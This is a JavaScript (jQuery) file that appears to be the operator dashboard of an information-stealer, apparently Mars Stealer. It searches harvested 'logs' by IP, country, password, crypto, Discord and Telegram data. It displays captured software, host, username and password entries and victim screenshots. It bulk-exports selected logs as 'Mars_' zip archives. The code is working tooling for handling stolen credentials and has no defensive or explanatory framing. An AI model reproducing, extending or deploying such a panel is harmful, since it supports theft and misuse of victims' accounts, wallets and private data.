//Add rule in db from form and out on page
$(document).ready(function() 
{
/////////////////On click search button	

	$("body").on("click", "#btn-search", function () {
		var id = $('#idField').val();
		var ip = $('#ipField').val();
		var country = $('#countryField').val();
		var tag = $('#tagsField').val();
		var marker = $('#markerField').val();
		var note = $('#noteField').val();
		var system = $('#systemField').val();
		var pwd = $('#passwordField').val();
		var date = $('#reportrange').val();
		var empty = $('#emptyCheckbox').is(':checked');
		var unique = $('#uniqueCheckbox').is(':checked');
		var crpt = $('#cryptoCheckbox').is(':checked');
		var discord = $('#discordCheckbox').is(':checked');
		var telegram = $('#telegramCheckbox').is(':checked');
		var exts = $('#extentionsCheckbox').is(':checked');
		
		$.ajax({
			url: "includes/logsactions.php",
			type: "POST",
			data:{func:'logssearch', page:1, id:id, ip:ip, country:country, tag:tag, marker:marker, note:note, system:system, date:date, pwd:pwd, empty:empty, unique:unique, telegram:telegram, discord:discord, crpt:crpt, exts:exts},
			dataType: "json",
			success: function(result){
				$('#rows').empty();
				$('#rows').append(result)
				
			}
		});
		return false;
	});
	
/////////////////On load page	
	
	function logsload () {
		
		$.ajax({
			url: "includes/logsactions.php",
			type: "POST",
			data:{func:'logssearch', page:1, id:null, ip:null, country:null, tag:null, marker:null, note:null, system:null, date:null, pwd:null, empty:null, unique:null, telegram:null, discord:null, crpt:null, exts:null},
			dataType: "json",
			success: function(result){				
				$('#rows').append(result)				
			}
		});
		return false;
	}
	
	 logsload ();
	
/////////////////On change pages

	$("body").on("click", ".btn-page", function () {
		var page = $(this).attr('id');
		var id = $('#idField').val();
		var ip = $('#ipField').val();
		var tag = $('#tagsField').val();
		var marker = $('#markerField').val();
		var country = $('#countryField').val();
		var note = $('#noteField').val();
		var system = $('#systemField').val();
		var pwd = $('#passwordField').val();
		var sorted = $('#sort_date').attr('sort');
		var date = $('#dateField').val();
		var empty = $('#emptyCheckbox').is(':checked');
		var unique = $('#uniqueCheckbox').is(':checked');
		var crpt = $('#cryptoCheckbox').is(':checked');
		var discord = $('#discordCheckbox').is(':checked');
		var telegram = $('#telegramCheckbox').is(':checked');
		var exts = $('#extentionsCheckbox').is(':checked');
		if (sorted == "ASC")
		{
			sorted = "DESC"
		}
		else
		{
			sorted = "ASC"
		}
		$.ajax({
			url: "includes/logsactions.php",
			type: "POST",
			data:{func:'logssearch', page:page, id:id, ip:ip, country:country, tag:tag, marker:marker, sorted:sorted, note:note, system:system, date:date, pwd:pwd, empty:empty, unique:unique, telegram:telegram, discord:discord, crpt:crpt, exts:exts},
			dataType: "json",
			success: function(result){
				$('#rows').empty();
				$('#rows').append(result)
				
			}
		});
		return false;
	});
	
/////////////////On click sorted

	$("body").on("click", "#sort_date", function () {
		var id = $('#idField').val();
		var ip = $('#ipField').val();
		var tag = $('#tagsField').val();
		var marker = $('#markerField').val();
		var country = $('#countryField').val();
		var note = $('#noteField').val();
		var system = $('#systemField').val();
		var pwd = $('#passwordField').val();
		var date = $('#dateField').val();
		var sorted = $(this).attr('sort');
		var empty = $('#emptyCheckbox').is(':checked');
		var unique = $('#uniqueCheckbox').is(':checked');
		var crpt = $('#cryptoCheckbox').is(':checked');
		var discord = $('#discordCheckbox').is(':checked');
		var telegram = $('#telegramCheckbox').is(':checked');
		var exts = $('#extentionsCheckbox').is(':checked');
		
		$.ajax({
			url: "includes/logsactions.php",
			type: "POST",
			data:{func:'logssearch', page:1, id:id, ip:ip, country:country, tag:tag, marker:marker, note:note, sorted:sorted, system:system, date:date, pwd:pwd, empty:empty, unique:unique, telegram:telegram, discord:discord, crpt:crpt, exts:exts},
			dataType: "json",
			success: function(result){
				$('#rows').empty();
				$('#rows').append(result)			
			}
		});
		return false;
	});

/////////////////

	$("body").on("click", ".btn-select-all", function () {
		if($(this).is(':checked'))
		{
			$('tbody input:checkbox').prop('checked', true);				
		}
		else
		{
			$('tbody input:checkbox').prop('checked', false);	
		}
	});
	
/////////////////

	$("body").on("click", ".btn-unselect-all", function () {
		$('tbody input:checkbox').prop('checked', false);
	});
	
	
/////////////////btn modalPwds

	$("body").on("click",".btn-modalcl", function () {
		var id = $(this).parent().parent().attr('id');		
		$.ajax({
			url: "includes/logsactions.php",
			type: "POST",
			data:{func:'modalpwds', id:id},
			dataType: "json",
			success: function(result){
				$('#onetwo').children().remove();
				$("#myModal").modal('show');			
				result.forEach( res => $('#onetwo').append(
					
					'<tr>'+
						'<td style="max-width:9.313rem;">'+ res.SOFT + '</td>'+
						'<td style="max-width:5.438rem;">'+ res.PROF + '</td>'+
						'<td style="max-width:31.688rem;">'+ res.HOST + '</td>'+
						'<td style="max-width:13.938rem;">'+ res.USER + '</td>'+
						'<td style="max-width:8.688rem;">'+ res.PASS + '</td>'+
					'</tr>'	
				))	
				
			}
		});
		return false;
	});
	
/////////////////btn modal screenshot

	$("body").on("click",".btn-modalscr", function () {
		$('.modal-body3').children().remove();
		var log = $(this).attr('log');
		var path = $(this).attr('path');
		$("#modalScreenshot").modal('show');
		$('.modal-body3').append('<img src="view.php?path='+path+'" width="100%">');
		
		return false;
	});

/////////////////On click button save note

	$("body").on("click", ".btn_saveNote", function () {
		var id = $(this).parent().parent().parent().parent().attr('id');
		var note = $(this).parent().parent().children('textarea').val();
		$.ajax({
			url: "includes/logsactions.php",
			type: "POST",
			data:{func:'savenote', id:id, note:note},
			dataType: "json"
		});
	});
	
/////////////////On click delete log
	
$("body").on("click", ".btn-deleteLog", function () {
		$row = $(this);
		var id = $row.parent().parent().attr('id');
		$.ajax({
			url: "includes/logsactions.php",
			type: "POST",
			data:{func:'deletelog', id:id},
			dataType: "json",
			success: $row.parent().parent().remove()
		});
	});

/////////////////

function urlToPromise(url) 
{
    return new Promise(function(resolve, reject) 
	{
        JSZipUtils.getBinaryContent(url, function (err, data) 
		{
            if(err) 
			{
                reject(err);
            } else 
			{
                resolve(data);
            }
        });
    });
}
	
/////////////////Download selected

$("body").on("click", ".btn-downloadLogs", function () {
	
	$('#modalDownloader').modal({show:true});
	
	var progressbar = document.getElementById("downloader_progressbar");
	
	var zip = new JSZip();
	
	$('.check-rows').each(function(){
		if($(this).is(':checked'))
		{
			var link = $(this).attr('link_to_download');
			var name = $(this).attr('file_name');
			
			
			document.getElementById("downloader_label_modal").innerHTML="Waiting generate zip...";
			zip.file(name, urlToPromise(link), {binary:true});
		}
	});
	
	zip.generateAsync({type:"blob"}).then(function(content)
	{
		var today = new Date();
		var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
		var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
		var dateTime = date+'_'+time;
		
		document.getElementById("downloader_label").innerHTML="Mars_"+dateTime+".zip";
		
		saveAs(content, "Mars_"+dateTime+".zip");
	});
	
		
});

/////////////////Download searched

	$("body").on("click", "#btn-dowloadSearched", function () 
	{
		let paths = new Object();
		var page = $(this).attr('id');
		var id = $('#idField').val();
		var ip = $('#ipField').val();
		var tag = $('#tagsField').val();
		var marker = $('#markerField').val();
		var country = $('#countryField').val();
		var note = $('#noteField').val();
		var system = $('#systemField').val();
		var pwd = $('#passwordField').val();
		var date = $('#dateField').val();
		var empty = $('#emptyCheckbox').is(':checked');
		var unique = $('#uniqueCheckbox').is(':checked');
		var crpt = $('#cryptoCheckbox').is(':checked');
		var discord = $('#discordCheckbox').is(':checked');
		var telegram = $('#telegramCheckbox').is(':checked');
		var exts = $('#extentionsCheckbox').is(':checked');
			
		$.ajax({
			url: "includes/logsactions.php",
			type: "POST",
			data:{func:'logssearchload', id:id, ip:ip, country:country, tag:tag, marker:marker, note:note, system:system, date:date, pwd:pwd, empty:empty, unique:unique, telegram:telegram, discord:discord, crpt:crpt, exts:exts},
			dataType: "json",
			success: function(result){
				paths = result;	
			},
			async: false
		});
		$('#modalDownloader').modal({show:true});
		
		var zip = new JSZip();
		
		document.getElementById("downloader_label_modal").innerHTML="Waiting generate zip...";
		
		const keys = Object.keys(paths);
		keys.forEach(function(name, index) {
			var link = paths[name];
			zip.file(name, urlToPromise(link), {binary:true});
			//var progress = 100 / (keys.length / (index + 1));
			
			//$('#progress_bar').attr('style','width: ' + progress+"%");
		});
		
		
		zip.generateAsync({type:"blob"}).then(function(content)
		{
			var today = new Date();
			var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
			var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
			var dateTime = date+'_'+time;
			
			document.getElementById("downloader_label").innerHTML="Mars_"+dateTime+".zip";
			
			saveAs(content, "Mars_"+dateTime+".zip");

		});
		
			
	});
	
/////////////////On click delete selected logs
	
	$("body").on("click", "#btn-deleteLogs", function () {
		
		var ids = new Array();
		$('.check-rows').each(function(){
			if($(this).is(':checked'))
			{
				ids.push($(this).parent().parent().parent().attr("id"));
				$(this).parent().parent().parent().remove();
			}
		});
		$.ajax({
			url: "includes/logsactions.php",
			type: "POST",
			data:{func:'deletelogs', ids:ids},
			dataType: "json"				
		});	
		return false;
	});

});

//////////////////

